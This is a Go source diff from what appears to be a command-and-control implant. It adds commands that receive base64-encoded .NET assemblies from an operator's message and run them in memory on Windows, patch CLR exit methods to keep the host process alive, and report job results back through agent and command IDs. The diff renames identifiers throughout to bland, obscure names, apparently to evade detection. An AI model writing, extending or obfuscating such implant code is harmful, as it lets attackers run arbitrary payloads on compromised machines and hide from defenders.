@@ -13,7 +13,7 @@ import (
 	"time"
 )
 
-type IATemplate struct {
+type NativeRunCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -51,28 +51,28 @@ var (
 
 var (
 	exitPreventionOnce sync.Once
-	exitPrevention     *CLRExitPrevention
+	exitPrevention     *RuntimeGuard
 	exitMethodsPatched bool
 )
 
 func InitializeExitPrevention() {
 	exitPreventionOnce.Do(func() {
 		exitPrevention = NewCLRExitPrevention()
-		if err := exitPrevention.PatchAllExitMethods(); err == nil {
+		if err := exitPrevention.patchAllExitMethods(); err == nil {
 			exitMethodsPatched = true
 		}
 	})
 }
 
-type InlineAssemblyCommand struct{}
+type NativeRunMsg struct{}
 
-func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		var tpl IATemplate
-		if err := json.Unmarshal([]byte(ctx.CurrentCommand.Data), &tpl); err == nil && tpl.Templates != nil {
+func (c *NativeRunMsg) execute(ctx *OpCtx, args []string) OpResult {
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		var tpl NativeRunCfg
+		if err := json.Unmarshal([]byte(ctx.CurrentMsg.Data), &tpl); err == nil && tpl.Templates != nil {
 			SetInlineAssemblyTemplate(tpl.Templates)
 		} else {
-			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 			if err == nil {
 				if err := json.Unmarshal(decoded, &tpl); err == nil {
 					SetInlineAssemblyTemplate(tpl.Templates)
@@ -83,9 +83,9 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 
 	osWindows := iaOsWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E42),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -99,14 +99,14 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 	var output strings.Builder
 
 	var configData string
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		configData = ctx.CurrentCommand.Data
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		configData = ctx.CurrentMsg.Data
 	} else if len(args) > 0 {
 		configData = strings.Join(args, " ")
 	} else {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E43),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -129,18 +129,18 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 				config.Arguments = args[1:]
 			}
 		} else {
-			return CommandResult{
+			return OpResult{
 				Output:   Err(E44),
-				ExitCode: 1,
+				EC: 1,
 			}
 		}
 	}
 
 	assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E45),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -148,24 +148,24 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 
 	output.WriteString(assemblyOutput)
 
-	return CommandResult{
+	return OpResult{
 		Output:   output.String(),
-		ExitCode: exitCode,
+		EC: exitCode,
 	}
 }
 
-// InlineAssemblyAsyncCommand handles async inline .NET assembly execution
-type InlineAssemblyAsyncCommand struct {
-	InlineAssemblyCommand
+// NativeAsyncMsg handles async inline .NET assembly execution
+type NativeAsyncMsg struct {
+	NativeRunMsg
 }
 
-func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		var tpl IATemplate
-		if err := json.Unmarshal([]byte(ctx.CurrentCommand.Data), &tpl); err == nil && tpl.Templates != nil {
+func (c *NativeAsyncMsg) execute(ctx *OpCtx, args []string) OpResult {
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		var tpl NativeRunCfg
+		if err := json.Unmarshal([]byte(ctx.CurrentMsg.Data), &tpl); err == nil && tpl.Templates != nil {
 			SetInlineAssemblyTemplate(tpl.Templates)
 		} else {
-			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 			if err == nil {
 				if err := json.Unmarshal(decoded, &tpl); err == nil {
 					SetInlineAssemblyTemplate(tpl.Templates)
@@ -177,29 +177,29 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 	jobPrefixFmt := iaJobPrefix()
 	jobID := fmt.Sprintf(jobPrefixFmt, time.Now().UnixNano())
 
-	var currentCmd Command
-	if ctx.CurrentCommand != nil {
-		currentCmd = *ctx.CurrentCommand
+	var currentCmd Msg
+	if ctx.CurrentMsg != nil {
+		currentCmd = *ctx.CurrentMsg
 		currentCmd.JobID = jobID
 	}
 
 	statusRun := iaStatusRun()
-	job := &AssemblyJob{
+	job := &NativeJob{
 		ID:          jobID,
-		CommandID:   currentCmd.CommandID,
-		CommandDBID: currentCmd.CommandDBID,
-		AgentID:     currentCmd.AgentID,
+		CID:   currentCmd.CID,
+		DID: currentCmd.DID,
+		AID:     currentCmd.AID,
 		Name:        currentCmd.Filename,
 		Status:      statusRun,
 		StartTime:   time.Now(),
 		CancelChan:  make(chan bool, 1),
-		Command:     currentCmd,
+		Cmd:     currentCmd,
 	}
 
-	assemblyJobManager.AddJob(job)
+	assemblyJobManager.addJob(job)
 
 	cmdNameAsync := iaCmdNameAsync()
-	jobInfo := JobInfo{
+	jobInfo := WI{
 		ID:        jobID,
 		StartTime: time.Now(),
 		Filename:  currentCmd.Filename,
@@ -227,15 +227,15 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 				finalOutput := job.Output.String()
 				job.OutputMutex.Unlock()
 
-				crashResult := CommandResult{
+				crashResult := OpResult{
 					Output:      finalOutput,
 					Error:       job.Error,
-					ExitCode:    -1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    -1,
+					Done: time.Now().Format(time.RFC3339),
 					JobID:       jobID,
 				}
 				if resultManager != nil {
-					resultManager.AddResult(&crashResult)
+					resultManager.addResult(&crashResult)
 				}
 			}
 		}()
@@ -332,25 +332,25 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			commandQueue.mu.Unlock()
 		}
 
-		finalResult := CommandResult{
-			Command:     currentCmd,
+		finalResult := OpResult{
+			Cmd:     currentCmd,
 			Output:      finalOutput,
-			ExitCode:    exitCode,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    exitCode,
+			Done: time.Now().Format(time.RFC3339),
 			JobID:       jobID,
 		}
 
 		if resultManager != nil {
-			resultManager.AddResult(&finalResult)
+			resultManager.addResult(&finalResult)
 		}
 
 	}()
 
 	fmtStarted := iaFmtStarted()
-	return CommandResult{
+	return OpResult{
 		Output:      fmt.Sprintf(fmtStarted, jobID),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 		JobID:       jobID,
 	}
 }
